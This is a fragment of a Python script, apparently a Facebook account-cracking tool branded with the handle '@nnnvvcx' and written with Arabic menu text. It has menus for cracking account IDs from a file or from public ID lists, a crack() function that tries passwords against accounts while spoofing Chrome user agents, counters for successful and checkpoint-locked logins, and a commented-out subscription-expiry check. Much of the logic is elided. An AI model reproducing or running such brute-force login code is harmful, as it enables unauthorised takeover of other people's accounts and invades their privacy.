...
#g = datetime.datetime(2024, 8, 29, 7, 10, 9)
...
# if x.strftime('%x') == g.strftime('%x'):
    ...
    # if x.strftime('%X') > g.strftime('%X'):
        # print('\n\n')
        # print('     ' + 'خلص اشتراك عليك مراجعة صانع اداة @nnnvvcx  ☄️🗿')
        # print('\n\n')
        # print(x)
        # sys.exit(0)
    # else:
...
ua = UserAgent()
user_ahd = ua.chrome
ugen3=[user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd]
ugen2 = [
...
def main():
    ...
    print('• 𝖓𝖓𝖓𝖛𝖛𝖈𝖝؛💘💋 ♥ @nnnvvcx •')
    print('—'*25)
    print(f'''{H} [1] - Crack File صيد من ملف''')
    print(f'''{H} [2] - Crack Publik صيد من اديهات''')
    print(f'''{H} [0] - login خروج''')
    _____alvino__adijaya_____ = input(f'''{u} [+] Choose :اختار ''')
...
def setting():
    ...
    if hu in ('1', '01'):
        ...
        exit()
    print(f'''{N}├───────────────────────────────────────────────────────''')
    print(f'''{N}├───[{H}1{N}] Mobile {H}[𝖓𝖓𝖓𝖛𝖛𝖈𝖝؛💘💋 𝘿𝙉𝙍]{N}''')
    print(f'''{N}├───[{H}2{N}] Mbasic ''')
    print(f'''├──╭[{h}CHOICE 𝖓𝖓𝖓𝖛𝖛𝖈𝖝؛💘💋 {N}]────────────────────────────────────────────''')
    hc = input(f'''│  ╰─➣{h} ''')
    if hc in ('1', '01'):
...
def crack(idf, pwv):
    ...
    fff = '%'
    print('\r%s [ 𝖓𝖓𝖓𝖛𝖛𝖈𝖝؛💘💋  ] %s/%s - OK : %s - CP : %s - %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    ...
                    print('\n')
                    statuscp = f'''{A}| @nnnvvcx
					🇫​​​​​🇦​​​​​🇨​​​​​🇪​​​​​🇧​​​​​🇴​​​​​🇴​​​​​🇰​​​​​ 👨🏻‍💻  جاك حساب سكيور 
          ┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┒
۝  @nnnvvcx ⚜️ احمد ⚜️ @nnnvvcx   ۝ ┖┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┈┈┚
